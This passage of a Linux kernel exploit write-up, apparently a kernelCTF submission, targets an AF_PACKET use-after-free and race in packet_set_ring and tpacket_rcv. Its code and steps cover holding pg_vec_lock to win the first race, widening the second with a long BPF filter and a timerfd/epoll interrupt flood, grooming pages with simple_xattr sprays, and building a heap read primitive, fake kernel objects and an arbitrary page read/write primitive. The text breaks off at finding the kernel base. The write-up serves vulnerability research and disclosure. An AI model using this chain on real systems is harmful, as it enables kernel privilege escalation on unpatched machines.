	if (unlikely(!(dev->flags & IFF_UP))) // [3]
		goto out_put;

	// ...

	reinit_completion(&po->skb_completion);

	do {
		ph = packet_current_frame(po, &po->tx_ring,
					  TP_STATUS_SEND_REQUEST);
		if (unlikely(ph == NULL)) {
			if (need_wait && skb) { // [4]
				timeo = sock_sndtimeo(&po->sk, msg->msg_flags & MSG_DONTWAIT);
				timeo = wait_for_completion_interruptible_timeout(&po->skb_completion, timeo); // [5]
				if (timeo <= 0) {
					err = !timeo ? -ETIMEDOUT : -ERESTARTSYS;
					goto out_put;
				}
			}
			continue;
		}

		skb = NULL;
		tp_len = tpacket_parse_header(po, ph, size_max, &data); // [6]
		if (tp_len < 0)
			goto tpacket_error;

		status = TP_STATUS_SEND_REQUEST;
		hlen = LL_RESERVED_SPACE(dev);
		tlen = dev->needed_tailroom;

		// ...

		copylen = max_t(int, copylen, dev->hard_header_len);
		skb = sock_alloc_send_skb(&po->sk, // [7]
				hlen + tlen + sizeof(struct sockaddr_ll) +
				(copylen - dev->hard_header_len),
				!need_wait, &err);

		// ...
		tp_len = tpacket_fill_skb(po, skb, ph, dev, data, tp_len, proto, // [8]
					  addr, hlen, copylen, &sockc);
		if (likely(tp_len >= 0) &&
		    tp_len > dev->mtu + reserve &&
		    !vnet_hdr_sz &&
		    !packet_extra_vlan_len_allowed(dev, skb))
			tp_len = -EMSGSIZE;

		if (unlikely(tp_len < 0)) { // [9]
tpacket_error:
			if (packet_sock_flag(po, PACKET_SOCK_TP_LOSS)) { // [10]
				__packet_set_status(po, ph,
						TP_STATUS_AVAILABLE);
				packet_increment_head(&po->tx_ring);
				kfree_skb(skb);
				continue; // [11]
			} else {
				status = TP_STATUS_WRONG_FORMAT;
				err = tp_len;
				goto out_status;
			}
		}

		// ...
	} while (likely((ph != NULL) ||
		 (need_wait && packet_read_pending(&po->tx_ring))));

	// ...
out:
	mutex_unlock(&po->pg_vec_lock); // [12]
	return err;
}
```

```c
/**
 * wait_for_completion_interruptible_timeout: - waits for completion (w/(to,intr))
 * @x:  holds the state of this particular completion
 * @timeout:  timeout value in jiffies
 *
 * This waits for either a completion of a specific task to be signaled or for a
 * specified timeout to expire. It is interruptible. The timeout is in jiffies.
 *
 * Return: -ERESTARTSYS if interrupted, 0 if timed out, positive (at least 1,
 * or number of jiffies left till timeout) if completed.
 */
long wait_for_completion_interruptible_timeout(struct completion *x, unsigned long timeout);
```

- [1] => we control `need_wait`.
- At [2], acquire the `po->pg_vec_lock` mutex 
- At [3], the network interface we select must in UP state.
- At [4], we need `skb != NULL`.
- At [5], reach this code path will put the thread to sleep while holding the mutex. We control how long the thread will sleep.
- At [6], `tp_len` is read from our Tx ring buffer.
- After [7], `skb != NULL`. There's a code path inside `sock_alloc_send_skb()` that check `sk->sk_err` and will lead to `skb == NULL` if `sk->sk_err != 0`. I mention this because the packet socket we used here already bound to the network interface for the later bug triggering process. `sk->sk_err == ENETDOWN` in case the network interface is currently down (check `packet_notifier()` above). Therefore, while the bug triggering process require the network interface in down state, we still need to keep the network interface in `UP` state to further the progress in `tpacket_snd()`.
- At [8], we can force `tp_len < 0` to reach [9] and [10].
- At [10], we can configure packet socket with `PACKET_SOCK_TP_LOSS` flag.
- At [11], loop second time and we reach [5]. Now, we achieved what we want.
- At [12], release `po->pg_vec_lock` mutex.

Because this kernel code path will eventually lead to thread sleep, the exploit creates a thread named `pg_vec_lock_thread` to handle this process. `pg_vec_lock_thread` is configured to run on `CPU 0` , run with the lowest priority possible and implementation as boss-worker model. Main thread will send work to this thread when we want to hold `po->pg_vec_lock` mutex. By reading from `/proc/[tid]/stat` (`tid = gettid()`), we can check whether the thread is in sleep state to ensure the mutex is acquired as expected. After `pg_vec_lock_thread` thread is in sleep state, we can trigger `syscall(SYS_clock_gettime, CLOCK_MONOTONIC, &pg_vec_lock_acquire_time)` to get approximately time when the mutex is acquired. Because we also control how long the thread will sleep, we can calculate approximately the time when the mutex will release.

Now, we need another thread named `pg_vec_buffer_thread`. This thread will be used to handle the process of trigger `packet_set_ring()` free path on the victim packet socket and then trigger `packet_set_ring()` on another packet socket to reclaim the freed ring buffer. This thread is configured to run on `CPU 0` (same CPU as `pg_vec_lock_thread`). 

At this point, the process to trigger first race condition look like:
1. Acquire `po->pg_vec_lock` mutex with `pg_vec_lock_thread`.
2. Put the network interface to `DOWN` state.
3. Trigger `packet_set_ring()` free path (described in `UAF` section above).
4. Verify `pg_vec_buffer_thread` is in sleep state after trying to acquire the mutex to ensure we already run pass the logic bug. 
5. Put the network interface to `UP` state.
6. At this point, the first race condition is considered winning. We can begin to work on the second race condition.

#### Step4 note: Because `pg_vec_buffer_thread` has higher priority than `pg_vec_lock_thread`, we hope that in the future that `pg_vec_lock` mutex is released, `packet_set_ring()` is allowed to continue the execution, the scheduler will decide to switch to `packet_set_ring()`.

# Winning second race condition
We will use the packet socket created with `int trigger_sendmsg_packet_socket = socket(AF_PACKET, SOCK_PACKET, 0)` to send packet to the network interface. Call `sendmsg(trigger_sendmsg_packet_socket, ...)` will trigger kernel function `packet_sendmsg_spkt()`.

```c
static int packet_sendmsg_spkt(struct socket *sock, struct msghdr *msg,
			       size_t len)
{
	struct sock *sk = sock->sk;
	DECLARE_SOCKADDR(struct sockaddr_pkt *, saddr, msg->msg_name);
	struct sk_buff *skb = NULL;
	struct net_device *dev;
	struct sockcm_cookie sockc;
	__be16 proto = 0;
	int err;
	int extra_len = 0;


	if (saddr) {
		if (msg->msg_namelen < sizeof(struct sockaddr))
			return -EINVAL;
		if (msg->msg_namelen == sizeof(struct sockaddr_pkt))
			proto = saddr->spkt_protocol;
	} else
		return -ENOTCONN;

	saddr->spkt_device[sizeof(saddr->spkt_device) - 1] = 0;
retry:
	rcu_read_lock();
	dev = dev_get_by_name_rcu(sock_net(sk), saddr->spkt_device); // [1]
	err = -ENODEV;
	if (dev == NULL)
		goto out_unlock;

	err = -ENETDOWN;
	if (!(dev->flags & IFF_UP)) // [2]
		goto out_unlock;

	// ...

	if (!skb) {
		size_t reserved = LL_RESERVED_SPACE(dev);
		int tlen = dev->needed_tailroom;
		unsigned int hhlen = dev->header_ops ? dev->hard_header_len : 0;

		rcu_read_unlock();
		skb = sock_wmalloc(sk, len + reserved + tlen, 0, GFP_KERNEL); // [3]
		if (skb == NULL)
			return -ENOBUFS;

		skb_reserve(skb, reserved);
		skb_reset_network_header(skb);

		if (hhlen) {
			skb->data -= hhlen;
			skb->tail -= hhlen;
			if (len < hhlen)
				skb_reset_network_header(skb);
		}
		err = memcpy_from_msg(skb_put(skb, len), msg, len);
		if (err)
			goto out_free;
		goto retry;
	}

	// ...

	dev_queue_xmit(skb); // [4]
	// ...
}
```
- [1]: we can choose with network interface to send the packet to.
- [2]: network interface must in `UP` state.
- [3]: create packet.
- [4]: send packet to the network interface.

Call chain from `dev_queue_xmit()` to the hook function has two possibilities:

First possibility: `packet_set_ring()` still not set hook function from `tpacket_rcv()` to `packet_rcv()`
```c
dev_queue_xmit
	__dev_queue_xmit
		dev_hard_start_xmit
			xmit_one
				dev_queue_xmit_nit
					tpacket_rcv	
```

Second possibility: `packet_set_ring()` set hook function from `tpacket_rcv()` to `packet_rcv()`
```c
dev_queue_xmit
	__dev_queue_xmit
		dev_hard_start_xmit
			xmit_one
				dev_queue_xmit_nit
					packet_rcv	
```

- Although there are other ways to send packet to network interface, I decided to go with `packet_sendmsg_spkt()` because it has much less code path to reach the hook function which is better for the race.
- The data to write shouldn't be big to avoid taking too much time for copy data to the packet.
- The exploit creates a thread named `tpacket_rcv_thread` to perform the `tpacket_rcv()` triggering process. This thread is configured to run on `CPU 1` which is difference CPU from `pg_vec_buffer_thread`.

Assume we successfully trigger `tpacket_rcv()`, we want to slow down `tpacket_rcv()` as much as possible to give time for `packet_set_ring()` to free the ring buffer before `tpacket_rcv()` reach the point where `UAF` happen.

Take a look at `tpacket_rcv()` again:

```c
static int tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
		       struct packet_type *pt, struct net_device *orig_dev)
{
	struct sock *sk;
	struct packet_sock *po;
	struct sockaddr_ll *sll;
	unsigned int snaplen, res;

	sk = pt->af_packet_priv;
	po = pkt_sk(sk);

	// ...
	snaplen = skb->len; // [1]

	res = run_filter(skb, sk, snaplen); // [2]
	// ...

	if (snaplen > res)
		snaplen = res; // [3]

	// ...
```
```c
static unsigned int run_filter(struct sk_buff *skb,
			       const struct sock *sk,
			       unsigned int res)
{
	struct sk_filter *filter;

	rcu_read_lock();
	filter = rcu_dereference(sk->sk_filter);
	if (filter != NULL)
		res = bpf_prog_run_clear_cb(filter->prog, skb);
	rcu_read_unlock();

	return res;
}
```

- [1] : packet length
- [2] : run filter on the packet and return the packet length. The new length can be smaller than the original packet length.
- [3] : save new packet length.

The exploit creates the filter with code look like:
```c
#define MAX_FILTER_LEN 700
struct sock_filter filter[MAX_FILTER_LEN] = {};
for (int i = 0; i < MAX_FILTER_LEN - 1; i++) {
	filter[i].code = BPF_LD | BPF_IMM;
	filter[i].k = 0xcafebabe;
}

filter[MAX_FILTER_LEN - 1].code = BPF_RET | BPF_K;
filter[MAX_FILTER_LEN - 1].k = sizeof(size_t);
struct sock_fprog fprog = { .filter = config->filter, .len = MAX_FILTER_LEN };
setsockopt(victim_packet_socket, SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog));
```

- By having a lot of filter code to perform the `BPF_LD | BPF_IMM` instruction, we can waste time loading `0xcafebabe` to the register 699 times. This helps us a little bit with the second race.
- `BPF_RET | BPF_K` instruction will return the value specified in `k`. This is the truncated size of the packet. Because we cannot send packet in any form we want, we can leverage this filter to truncate the packet length to the overflow size we want. As the example shown above, `k == sizeof(size_t)` means we want to overwrite a field with has size equal to `sizeof(size_t)`.


Because using the filter alone is not enough to win the second race, the exploit employs the timer interrupt technique from Jann Horn. The implementation of the technique look like the following code:
```c
#define N 100000
int timerfd = timerfd_create(CLOCK_MONOTONIC, 0);
int epollfd = epoll_create1(0);
struct epoll_event epoll_events[N];
epoll_events[0].data.fd = timerfd;
epoll_events[0].events = EPOLLIN;
epoll_ctl(epollfd, EPOLL_CTL_ADD, timerfd, &epoll_events[0]);

for (int i = 0; i < N; i++) {
	int dup_timerfd = dup(timerfd);
	epoll_events[i].data.fd = dup_timerfd;
	epoll_events[i].events = EPOLLIN;
	epoll_ctl(epollfd, EPOLL_CTL_ADD, dup_timerfd, &epoll_events[i]);
}

struct itimerspec settime_value = {};
settime_value.it_value = timespec_add(pg_vec_lock_release_time, timer_interrupt_amplitude);
timerfd_settime(timerfd, TFD_TIMER_ABSTIME, &settime_value, NULL);
```

The idea is we will try to raise the interrupt at the programmed time to interrupt the `tpacket_rcv()`. When the interrupt happened, `timerfd_tmrproc()` is triggered.

```c
static enum hrtimer_restart timerfd_tmrproc(struct hrtimer *htmr)
{
	struct timerfd_ctx *ctx = container_of(htmr, struct timerfd_ctx,
					       t.tmr);
	timerfd_triggered(ctx);
	return HRTIMER_NORESTART;
}
```

```c
static void timerfd_triggered(struct timerfd_ctx *ctx)
{
	unsigned long flags;

	spin_lock_irqsave(&ctx->wqh.lock, flags);
	ctx->expired = 1;
	ctx->ticks++;
	wake_up_locked_poll(&ctx->wqh, EPOLLIN);
	spin_unlock_irqrestore(&ctx->wqh.lock, flags);
}
```

`wake_up_locked_poll()` -> `__wake_up_locked_key()` -> `__wake_up_common()`

```c
static int __wake_up_common(struct wait_queue_head *wq_head, unsigned int mode,
			int nr_exclusive, int wake_flags, void *key,
			wait_queue_entry_t *bookmark)
{
	wait_queue_entry_t *curr, *next;
	int cnt = 0;
	
	// ...

	list_for_each_entry_safe_from(curr, next, &wq_head->head, entry) { // [1]
		unsigned flags = curr->flags;
		int ret;

		if (flags & WQ_FLAG_BOOKMARK)
			continue;

		ret = curr->func(curr, mode, wake_flags, key);

		// ...
	}

	return nr_exclusive;
}
```

- [1] : each `epoll_ctl()` call from example code above will add one more entry to the list. By leverage the epoll, we can lengthen the list and make the interrupt handler took more time to finish.
- The entry is added to the list with function `ep_ptable_queue_proc()`.

```c
static void ep_ptable_queue_proc(struct file *file, wait_queue_head_t *whead,
				 poll_table *pt)
{
	struct ep_pqueue *epq = container_of(pt, struct ep_pqueue, pt);
	struct epitem *epi = epq->epi;
	struct eppoll_entry *pwq;

	if (unlikely(!epi))
		return;

	pwq = kmem_cache_alloc(pwq_cache, GFP_KERNEL);
	if (unlikely(!pwq)) {
		epq->epi = NULL;
		return;
	}

	init_waitqueue_func_entry(&pwq->wait, ep_poll_callback);
	pwq->whead = whead;
	pwq->base = epi;
	if (epi->event.events & EPOLLEXCLUSIVE)
		add_wait_queue_exclusive(whead, &pwq->wait);
	else
		add_wait_queue(whead, &pwq->wait); // [1]
	pwq->next = epi->pwqlist;
	epi->pwqlist = pwq;
}
```

- [1] : where the entry is added.

Although the technique is straightforward to use, using its on the KernelCTF environment need a little tweak. The problem is every file descriptor table can contain maximum 4096 file descriptors which is not enough to win the race. The exploit workaround the problem by first create a timerfd then create 180 threads that is named `timerfd_waitlist_thread`. Each thread performs the following things:
- Call `unshare(CLONE_FILES)` to create a private file descriptor table per thread.
- close() all file descriptor except the timerfd created before from main thread.
- Create epollfd.
- dup(timerfd) until the file descriptor table is full.
- Perform the `epoll_ctl()` with each timerfd like the code example above to lengthen the timerfd waitqueue list.

At this point, the process to trigger second race condition look like:
- Have the victim packet socket setting up the filter beforehand.
- Calculate the time to raise the interrupt. Use the `pg_vec_lock_release_time` as starting point.
- Arm the timer with `timerfd_settime()`. Because we configured `tpacket_rcv_thread` to run on `CPU 1`, `timerfd_settime()` must be call on `CPU 1` to ensure the interrupt will run on `CPU 1` and hit the `tpacket_rcv()` as expected.
- Send work to `tpacket_rcv_thread`. Beside from the packet data, we also send the `pg_vec_lock_release_time` value and a `decrease_sleep_time` value. Using `nanosleep(pg_vec_lock_release_time - decrease_sleep_time)`, we want the `tpacket_rcv_thread` to sleep until the time nearly `pg_vec_lock_release_time`. If we let `tpacket_rcv_thread` send packet too early, we ensure `tpacket_rcv()` will trigger but `packet_set_ring()` thread still sleeping. If we let `tpacket_rcv_thread` send packet too late, the hook function is set to `packet_rcv()`.
- Main thread releases CPU and wait for all threads to finish the work.

# pages_order2_read_primitive
### Prepare victim packet socket attributes:
1. `Tx ring buffer` :
```c
struct tpacket_req3 tx_ring = {};
tx_ring.tp_block_size = PAGES_ORDER1_SIZE;
tx_ring.tp_block_nr = 1;
tx_ring.tp_frame_size = PAGES_ORDER1_SIZE;
tx_ring.tp_frame_nr = tx_ring.tp_block_size / tx_ring.tp_frame_size * tx_ring.tp_block_nr;
```

2.  `Rx ring buffer`:
```c
struct tpacket_req3 rx_ring = {};
rx_ring.tp_block_size = PAGES_ORDER3_SIZE;
rx_ring.tp_block_nr = MIN_PAGE_COUNT_TO_ALLOCATE_PGV_ON_KMALLOC_16;
rx_ring.tp_frame_size = PAGES_ORDER3_SIZE;
rx_ring.tp_frame_nr = rx_ring.tp_block_size / rx_ring.tp_frame_size * rx_ring.tp_block_nr;
rx_ring.tp_sizeof_priv = 16248;
rx_ring.tp_retire_blk_tov = USHRT_MAX;
```
3. `packet_reserve == 38`

4. `socket filter`:
```c
struct sock_filter filter[MAX_FILTER_LEN] = {};
for (int i = 0; i < MAX_FILTER_LEN - 1; i++) {
	filter[i].code = BPF_LD | BPF_IMM;
	filter[i].k = 0xcafebabe;
}

filter[MAX_FILTER_LEN - 1].code = BPF_RET | BPF_K;
filter[MAX_FILTER_LEN - 1].k = sizeof(size_t);
```

5. `sndtimeo` : decide how long the `pg_vec_lock_thread` will sleep while holding the `pg_vec_lock` mutex. I chose one second.
6. `packet_version == TPACKET_V3`.

### Prepare requests to spray `simple_xattr` kernel objects
```c
struct rb_node {
	unsigned long  __rb_parent_color;
	struct rb_node *rb_right;
	struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

struct simple_xattr {
	struct rb_node rb_node;
	char *name;
	size_t size;
	char value[];
};
```
```c
// Example code to prepare requests
struct simple_xattr_request {
        char filepath[PATH_MAX];
        char name[XATTR_NAME_MAX + 1];
        char *value;
        size_t value_size;
        bool allocated;
};

#define PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH        "/tmp/tmpfs/pages_order2_groom"
#define PAGES_ORDER2_GROOM_SIMPLE_XATTR_NAME_FMT        "security.pages_order2_groom_%d"
#define PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_FMT       "pages_order2_groom_%d"
#define TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY           2048

for (int i = 0; i < TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY; i++) {
	char value[XATTR_SIZE_MAX] = {};
	char name[XATTR_NAME_MAX + 1] = {};
	snprintf(name, sizeof(name), PAGES_ORDER2_GROOM_SIMPLE_XATTR_NAME_FMT, i);
	snprintf(value, sizeof(value), PAGES_ORDER2_GROOM_SIMPLE_XATTR_VALUE_FMT, i);
	simple_xattr_request = simple_xattr_request_create(
		PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH,
		name,
		value,
		KMALLOC_8K_SIZE // value_size
	);

	primitive->simple_xattr_requests[i] = simple_xattr_request;
}

// sizeof(struct simple_xattr) == 40 and value_size == 8192 => `struct simple_xattr` object will be allocated from pages with `PAGES_ORDER2_SIZE`.
```

The primitive building process looks like:
1. Pin current execution to `CPU 0` (same CPU as `pg_vec_buffer_thread`).
2. Create 3 packet sockets: `drain_pages_order2_packet_socket`, `drain_pages_order3_packet_socket_1` and `drain_pages_order3_packet_socket_2`.
3. Use `drain_pages_order2_packet_socket` to allocate 1024 pages with `PAGES_ORDER2_SIZE`.
4. Use `drain_pages_order3_packet_socket_1` to allocate 1024 pages with `PAGES_ORDER3_SIZE`.
5. Use `drain_pages_order3_packet_socket_2` to allocate 512 pages with `PAGES_ORDER3_SIZE`.
6. Configure the victim packet socket. Rx ring buffer is allocated at this step. The expectation is buffers from Rx ring buffer will have higher address than the buffers allocated with `drain_pages_order3_packet_socket_1`. [(To satisfy condition mention above)](#assume-we-manage-to-page-groom-in-such-a-way-that-end-came-from-lower-address-and-curr-came-from-higher-address-we-can-avoid-code-path-at-1-and-we-enter-prb_retire_current_block)
7. Free all pages allocated from step 4.
8. Spray 2048 `struct simple_xattr` objects to reclaim freed pages from step 7. Although the allocation of `struct simple_xattr` object should be served from `PAGES_ORDER2_SIZE` freelist, Page allocator use Buddy Algorithm means in the situation where there is no page with `PAGES_ORDER2_SIZE` on the freelist, the kernel will took pages from `PAGES_ORDER3_SIZE` freelist and split into two half: first half used to serve the allocation and the other half is saved to `PAGES_ORDER2_SIZE` freelist.
9. Free some `struct simple_xattr` objects to leave slot for the reclamation ring buffer. The implementation look like:

```c
	for (int i = 512; i < ARRAY_SIZE(primitive->simple_xattr_requests); i += 128) {
		Removexattr(
			primitive->simple_xattr_requests[i]->filepath,
			primitive->simple_xattr_requests[i]->name
		);

		primitive->simple_xattr_requests[i]->allocated = false;
	}
```
9. Trigger the page overflow process. The expected outcome is the exploit manage to overwrite the `size` member from one of the `struct simple_xattr` object with 65536. This is the maximum value allowed for a `struct simple_xattr` object.
10. Validate whether the overflow success with the implementation look like:

```c
bool overflow_success = false;

for (int i = 0; i < TOTAL_PAGES_ORDER2_SIMPLE_XATTR_SPRAY && !overflow_success; i++) {
	char value[KMALLOC_8K_SIZE] = {};
	
	simple_xattr_request = primitive->simple_xattr_requests[i];
	if (!simple_xattr_request || !simple_xattr_request->allocated)
		continue;

	ssize_t getxattr_ret = getxattr(
		simple_xattr_request->filepath,
		simple_xattr_request->name,
		value,
		KMALLOC_8K_SIZE
	);

	if (getxattr_ret < 0 && errno == ERANGE) {
		primitive->overflowed_simple_xattr_request = simple_xattr_request;
		primitive->simple_xattr_requests[i] = NULL;
		overflow_success = true;
	}

}
```

- Originally, each `struct simple_xattr` object has `size == KMALLOC_8K_SIZE`. The overflowed one has `size == 65536`. Trying to call `getxattr(KMALLOC_8K_SIZE)` on the overflowed one will lead to error with `errno == ERANGE`. The exploit uses this behavior to detect the overflowed object. We will refer to this object as `overflowed_simple_xattr`.
- From now on, every time we trigger `getxattr(primitive->overflowed_simple_xattr_request->filepath, primitive->overflowed_simple_xattr_request->name, value, 65536)`, we got a heap leak.

11. Leak heap and look for at least one recognize `struct simple_xattr` object. Let's call this object `leaked_content_simple_xattr`. If we don't find any `struct simple_xattr` object, we consider the process of building `pages_order2_read_primitive` is fail and we need to restart the process.
12. Destroy every allocated `struct simple_xattr` objects except `overflowed_simple_xattr` object and `leaked_content_simple_xattr` object.
13. Use `pages_order2_read_primitive` to leak heap again. Currently, the red black tree contain only two `struct simple_xattr` objects, so `leaked_content_simple_xattr` object contains kernel address of `overflowed_simple_xattr` object. We will refer to this kernel address as `overflowed_simple_xattr_kernel_address`.
14. Use the offset where we found `leaked_content_simple_xattr` and `overflowed_simple_xattr_kernel_address`, we can calculate kernel address of `leaked_content_simple_xattr` object. We will refer to this kernel address as `leaked_content_simple_xattr_kernel_address`.

# simple_xattr_read_write_primitive
### Prepare packet sockets to allocate ring buffer

```c
#define TOTAL_PAGES_ORDER2_PG_VEC_SPRAY         256

for (int i = 0; i < TOTAL_PAGES_ORDER2_PG_VEC_SPRAY; i++)
	primitive->spray_pg_vec_packet_sockets[i] = Socket(AF_PACKET, SOCK_RAW, 0);
```

The primitive building process looks like:
1. Pin current execution to `CPU 0` (same CPU as `pg_vec_buffer_thread`).
2. Create 3 packet sockets: `drain_pages_order2_packet_socket`, `drain_pages_order3_packet_socket_1` and `drain_pages_order3_packet_socket_2`.
3. Use `drain_pages_order2_packet_socket` to allocate 256 pages with `PAGES_ORDER2_SIZE`.
4. Use `drain_pages_order3_packet_socket_1` to allocate 128 pages with `PAGES_ORDER3_SIZE`.
5. Use `drain_pages_order3_packet_socket_2` to allocate 128 pages with `PAGES_ORDER3_SIZE`.
6. Configure the victim packet socket with the config exactly the same as the config used in `pages_order2_read_primtive` building process. The expectation is buffers from Rx ring buffer will have higher address than the buffers allocated with `drain_pages_order3_packet_socket_1`. [(To satisfy condition mention above)](#assume-we-manage-to-page-groom-in-such-a-way-that-end-came-from-lower-address-and-curr-came-from-higher-address-we-can-avoid-code-path-at-1-and-we-enter-prb_retire_current_block)
7. Free all pages allocated from step 4.
8. Use the prepared packet socket to spray 256 ring buffer. Each ring buffer has the minimum buffers for the allocation to be served from `PAGES_ORDER2_SIZE` freelist and each buffer has `PAGES_ORDER0_SIZE` to avoid using too much memory. As we described the Buddy Algorithm above, the expectation is these ring buffer will eventually reuse the pages freed from step 7.
9. Free some ring buffer to leave slot for the reclamation ring buffer. The implementation looks like:
```c
for (int i = 64, free_count = 0; i < ARRAY_SIZE(primitive->spray_pg_vec_packet_sockets) && free_count < 6; i += 16, free_count++) {
	free_pages(primitive->spray_pg_vec_packet_sockets[i]);
	primitive->spray_pg_vec_packet_sockets_state[i] = 0;
}
```
10. Trigger the page overflow process. The expected outcome is the exploit manage to overwrite one of ring buffer's buffer address with `leaked_content_simple_xattr_kernel_address`.
11. Validate whether the overflow success by mmaped each ring buffer and look for memory data look like `struct simple_xattr` object. We will refer to the packet socket with overflowed ring buffer as `overflowed_pg_vec_packet_socket`.


From now on, we can `mmap(overflowed_pg_vec_packet_socket)` and perform read/write on `leaked_content_simple_xattr` object. We will refer to the userspace memory that is currently used to manipulate `leaked_content_simple_xattr` object as `manipulated_simple_xattr`.

# abr_page_read_write_primitive
We begin by destroy `overflowed_simple_xattr` object. Now, the red black tree contain only `leaked_content_simple_xattr` object.

We need two `PAGES_ORDER2_SIZE` pages address:
- One to fake a `struct simple_xattr` object. We will refer to this object as `fake_simple_xattr` and this object's address as `fake_simple_xattr_addr`.
- One to fake `fake_simple_xattr->name`. We will refer to this object as `fake_simple_xattr_name` and this object's address as `fake_simple_xattr_name_addr`.

#### The process of building `fake_simple_xattr_name` looks like:
1. Create a packet socket. We will refer to this packet socket as `fake_simple_xattr_name_packet_socket`.
2. Allocate a `struct simple_xattr` object with `setxattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.leak_pages_order2_for_fake_simple_xattr_name", value, KMALLOC_8K_SIZE, XATTR_CREATE);`. We will refer to this object as `A`. `A` is allocated from `PAGES_ORDER2_SIZE` pages's freelist. `A` is on the same red black tree as `leaked_content_simple_xattr` object.
3. Use `manipulated_simple_xattr` to leak the address of `A`=> We have a `PAGES_ORDER2_SIZE` page address. Note: I chose to go with the lazy path by looking for pointer from `manipulated_simple_xattr->rb_node` instead of reading through kernel code to find out exactly the red black tree form.
4. Destroy `A`.
5. Use `fake_simple_xattr_name_packet_socket` to allocate a ring buffer with one buffer and the buffer has `PAGES_ORDER2_SIZE` to reclaim `A`.
6. `mmap()` ring buffer of `fake_simple_xattr_name_packet_socket` and write `"security.fake_simple_xattr_name"` to the buffer. Then, `munmap()` the buffer.
7. The process of validating whether we successfully reclaim `A` looks like:
	- Set `manipulated_simple_xattr->name = fake_simple_xattr_name_addr`.
	- `ssize_t ret = getxattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.fake_simple_xattr_name", value, manipulated_simple_xattr->size)`
	- If `ret == manipulated_simple_xattr->size`, we can confirm the reclamation success.
8. Set `manipulated_simple_xattr->name` back to the original value.
9. In case we confirmed reclamation is not success, we destroy the ring buffer and retry from step2.

#### The process of building `fake_simple_xattr` looks like:
1. Create a packet socket. We will refer to this packet socket as `fake_simple_xattr_packet_socket`.
2. Allocate a `struct simple_xattr` object with `setxattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.leak_pages_order2_for_fake_simple_xattr", value, KMALLOC_8K_SIZE, XATTR_CREATE);`. We will refer to this object as `B`. `B` is allocated from `PAGES_ORDER2_SIZE` pages's freelist. `B` is on the same red black tree as `leaked_content_simple_xattr` object.
3. Use `manipulated_simple_xattr` to leak the address of `B`=> We have a `PAGES_ORDER2_SIZE` page address. Keep track whether the leaked address coming from `rb_right` node or `rb_left` node.
4. Destroy `B`.
5. Use `fake_simple_xattr_packet_socket` to allocate a ring buffer with one buffer and the buffer has `PAGES_ORDER2_SIZE` to reclaim `B`.
6. `mmap()` ring buffer of `fake_simple_xattr_packet_socket` and write `"security.detect_fake_simple_xattr_reclaimation"` to the buffer.
7. The process of validating whether we successfully reclaim `B` looks like:
	- Set `manipulated_simple_xattr->name = fake_simple_xattr_addr`.
	- `ssize_t ret = getxattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.detect_fake_simple_xattr_reclaimation", value, manipulated_simple_xattr->size)`
	- If `ret == manipulated_simple_xattr->size`, we can confirm the reclamation success.
8. Set `manipulated_simple_xattr->name` back to the original value.
9. In case we confirmed reclamation is not success, we destroy the ring buffer and retry from step2.
10. `memset()` the mmaped ring buffer to all zeros.
11. Write a fake `struct simple_xattr` object to the mmaped ring buffer. The fake `struct simple_xattr` object looks like:
```c
struct simple_xattr *fake_simple_xattr = mem;
fake_simple_xattr->rb_node.__rb_parent_color = leaked_content_simple_xattr_kernel_address;
fake_simple_xattr->name = (char *)fake_simple_xattr_name_addr;
fake_simple_xattr->size = KMALLOC_8K_SIZE;
```

12. At step3, we keep track whether the node is right node or left node. Now, we can connect `fake_simple_xattr` to the red black tree by doing:
```c
if (is_right_node) {
	manipulated_simple_xattr->rb_node.rb_right = (void *)fake_simple_xattr_addr;
} else {
	manipulated_simple_xattr->rb_node.rb_left = (void *)fake_simple_xattr_addr;
}
```

#### The process of overlap ring buffer with buffer of ring buffer looks like:
1. Create a packet socket. We will refer to this packet socket as `overwritten_pg_vec_packet_socket`.
2. Trigger `removexattr(PAGES_ORDER2_GROOM_SIMPLE_XATTR_FILEPATH, "security.fake_simple_xattr_name")`. Both `fake_simple_xattr_name_addr` and `fake_simple_xattr_addr` are freed.
3. Use `overwritten_pg_vec_packet_socket` to allocate a ring buffer with size such that the allocation will be served from `PAGES_ORDER_2` pages freelist. The expectation is the ring buffer will be allocated at either `fake_simple_xattr_name_addr` or `fake_simple_xattr_addr`.
4. `mmap()` both `fake_simple_xattr_name_packet_socket` and `fake_simple_xattr_packet_socket`. Look for data represent a ring buffer to confirm the overlapped (kernel address after kernel address). 
5. Now, we have a `packet_socket_to_overwrite_pg_vec` and a `packet_socket_with_overwritten_pg_vec`.

From now on, we can perform arbitrary page read/write with the implementation looks like:
```c
void *abr_page_read_write_primitive_mmap(
	struct abr_page_read_write_primitive *abr_page_read_write_primitive,
	u64 page_aligned_addr_to_mmap
)
{
	if (page_aligned_addr_to_mmap & (PAGE_SIZE - 1)) {
		fprintf(stderr, "[abr_page_read_write_primitive_mmap]: page_aligned_addr_to_mmap is not page aligned\n");
		return NULL;
	}

	void *mem = Mmap(
		NULL,
		abr_page_read_write_primitive->overwrite_pg_vec_mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		abr_page_read_write_primitive->packet_socket_to_overwrite_pg_vec,
		0
	);

	struct pgv *pgv = mem;
	pgv[0].buffer = (char *)page_aligned_addr_to_mmap;
	Munmap(mem, abr_page_read_write_primitive->overwrite_pg_vec_mmap_size);

	mem = mmap(
		NULL,
		abr_page_read_write_primitive->overwritten_pg_vec_mmap_size,
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		abr_page_read_write_primitive->packet_socket_with_overwritten_pg_vec,
		0
	);

	if (mem == MAP_FAILED)
		return NULL;

	return mem;
}
```

# Find kernel base
The process of finding kernel base looks like:
1. Create pipe.
